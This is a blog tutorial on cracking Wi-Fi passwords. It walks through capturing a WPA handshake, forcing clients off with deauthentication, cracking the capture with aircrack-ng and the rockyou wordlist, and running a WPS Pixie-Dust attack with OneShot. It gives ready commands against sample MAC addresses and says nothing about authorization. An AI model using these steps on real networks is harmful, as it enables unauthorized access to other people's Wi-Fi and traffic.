---
title: " Hacking Wi-Fi. The easiest and most effective way"
date: 2020-02-17
draft: false
description: My experience of hacking WI-FI by handshake and vulnerability. 
tags:
  - linux
  - security
  - WI-FI    
---

 The article will be divided into two separate topics.

Three necessary tasks to complete:

- Catch handshake
- Decrypt it
- Identify vulnerabilities in WPS

There are various tools for implementing each of them, we will talk about them further.

I don't consider completely old access points, standard passwords and penetration through vulnerabilities in WPS (you can try with [wifite](https://github.com/derv82/wifite2)). So, I'm doing a handshake test between the router and its clients. This method is the most effective, but there is a nuance. The fact is that it is impossible to catch a handshake from the first attempt, it is necessary that the client disconnects from the router and reconnects at least 4 times (if we have a bad signal, then more). There are ways to forcibly death the device from the router, but then they can detect our interference. Waiting for natural reconnections can take quite a long time, it all depends on chance.

**Required:**

* [`iwconfig`](https://wiki.debian.org/iwconfig): For identifying wireless devices already in Monitor Mode.
* [`ifconfig`](https://en.wikipedia.org/wiki/Ifconfig): For starting/stopping wireless devices.
* [`Aircrack-ng`](http://aircrack-ng.org/) suite, includes:
  * [`airmon-ng`](https://tools.kali.org/wireless-attacks/airmon-ng): For enumerating and enabling Monitor Mode on wireless devices.
  * [`aircrack-ng`](https://tools.kali.org/wireless-attacks/aircrack-ng): For cracking WEP .cap files and WPA handshake captures.
  * [`aireplay-ng`](https://tools.kali.org/wireless-attacks/aireplay-ng): For deauthing access points, replaying capture files, various WEP attacks.
  * [`airodump-ng`](https://tools.kali.org/wireless-attacks/airodump-ng): For target scanning & capture file generation.
  * [`packetforge-ng`](https://tools.kali.org/wireless-attacks/packetforge-ng): For forging capture files.

**Optional:**

* [`Wifite2`](https://github.com/derv82/wifite2): CLI for manage many utils

* [`tshark`](https://www.wireshark.org/docs/man-pages/tshark.html): For detecting WPS networks and inspecting handshake capture files.

* [`reaver`](https://github.com/t6x/reaver-wps-fork-t6x): For WPS Pixie-Dust & brute-force attacks.
- [`bully`](https://github.com/aanarchyy/bully): For WPS Pixie-Dust & brute-force attacks.
* [`coWPAtty`](https://tools.kali.org/wireless-attacks/cowpatty): For detecting handshake captures.

* [`hashcat`](https://hashcat.net/): For cracking PMKID hashes.
  
  * [`hcxdumptool`](https://github.com/ZerBea/hcxdumptool): For capturing PMKID hashes.
  * [`hcxpcaptool`](https://github.com/ZerBea/hcxtools): For converting PMKID packet captures into `hashcat`'s format.

You must also have a Wi-Fi adapter that supports monitor mode to intercept handshake.

We put our Wi-Fi adapter into monitor mode:

Check name our wifi adapter, use  `ip a`:

![](/984c2c5e12e983ab346f56832c01fc0e226f386e.png)

Next, that will change the name of our adapter and add the mon prefix.

![](/1de217c3362562e974cffc6dc570cc1a7fb92b0d.png)

After that, you need to find out who is online. You can use the airodump-ng utility, which is part of Aircrack-ng, or you can get a more interesting interface through the kismet utility:

`airodump-ng wlp3s0mon:`

![](/df030300742d0806703e114d40d66fa88e4371ae.png)

Select the network you need (focus on pwr, you don't need a weak signal):

`airodump-ng wlp3s0mon --channel 1 -w cap2`

And we start recording on the radio msg channel of the desired BSSID.

If the handshake is not caught for a long time, you can make death this command:

`aireplay-ng -0 5 -a 20:25:64:16:58:8C wlp3s0mon`

With this command, we will disconnect clients from the router (if they are connected at all)

where -  `20: 25: 64: 16: 58: 8C`  - MAC  the target network that we are monitoring.

If it's successful, we will get a cap2 file, which you can try to crack with:

`aircrack-ng -w rockyou.txt handshake.cap`  

[download example dict rockyou.txt](https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt)

And the result after 2 minutes of waiting:

![](/5573bd171f4e1e69273c1e006c7076964984c974.png)

Penetration through WPS with **[Pixiewps](https://github.com/wiire-a/pixiewps)**

There is a simple and convenient utility for working with this program [OneShot](https://github.com/drygdryg/OneShot)

In dependencies which python3, wpa_supplicant and respectively **[Pixiewps](https://github.com/wiire-a/pixiewps)**

Download the script and scan the network:

```
sudo python3 oneshot.py -i wlp3s0mon -b 00:90:4C:C1:AC:21 -K
```

where `00: 90: 4C: C1: AC: 21` is the MAC of our network.

After a moment, we get a password.

reference guide:

https://github.com/derv82/wifite2

https://habr.com/ru/post/482914/
